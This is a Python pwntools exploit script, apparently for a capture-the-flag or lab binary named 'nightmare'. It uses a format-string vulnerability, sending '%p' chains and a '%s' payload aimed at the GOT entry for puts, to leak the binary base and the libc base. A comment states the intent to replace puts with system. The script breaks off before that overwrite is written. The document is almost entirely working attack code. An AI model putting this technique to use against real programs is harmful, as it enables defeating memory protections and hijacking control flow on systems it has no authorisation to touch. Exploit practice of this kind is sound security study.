from pwn import *

context.arch = 'amd64'

p = process('./nightmare')

elf = ELF('./nightmare')
libc = ELF('./libc.self')

OFFSET_LEAK = 0x14c9
OFFSET_PRINTF_BASE_LEAK_INDEX = 41
OFFSET_PRINTF_BUF_ADDR = 4

print(p.recv())
p.sendline('1')
print(p.recv())
p.sendline('AAAAAAAA' + '%p ' * 50)
leaks = p.recv(timeout=0.1)
print(leaks)
binary_base = int(leaks.decode('latin-1').split(' ')[OFFSET_PRINTF_BASE_LEAK_INDEX], 16) - OFFSET_LEAK
print(f"Got binary base address: {hex(binary_base)}")
procmaps = p.libs()
for i in procmaps:
    print(f"{i} : {hex(procmaps[i])}")
elf.address = binary_base
GOT_PUTS = elf.got['puts']

#try to leak puts address from GOT
p.sendline('1')
print(p.recv())
print(f"GOT_PUTS: {hex(GOT_PUTS)}")
payload = (('%p ' * 7)+'%s ').encode('latin-1')
payload += p64(GOT_PUTS)
p.sendline(payload)
result = p.recv(timeout=0.1)
print(result)
segments = result.decode('latin-1').split('What')[0]
resulttext = segments.split(' ')[7]
puts_leak = int.from_bytes(resulttext.encode('latin-1'), 'little')
print(f"Got address of PUTS: {hex(puts_leak)}")

libc_base = puts_leak - libc.sym['puts']
print(f"Libc base: {hex(libc_base)}")
libc.address = libc_base

#now we have libc and puts addresses, we can replace puts with system (maybe)

# gdb.attach(p)
# junk = ' '.join(segments.split(' ')[:7]) + ' '
# resulttext = segments[len(junk):]


def send_printf(payload):
    p.sendline('1')
    p.recv()
    print(payload)
    p.sendline(payload)
    output = p.recv()
    print(output)
    return output

# fmt = FmtStr(send_printf)


# gdb.attach(p)
#the 5th element refers to the beginning of the printf text



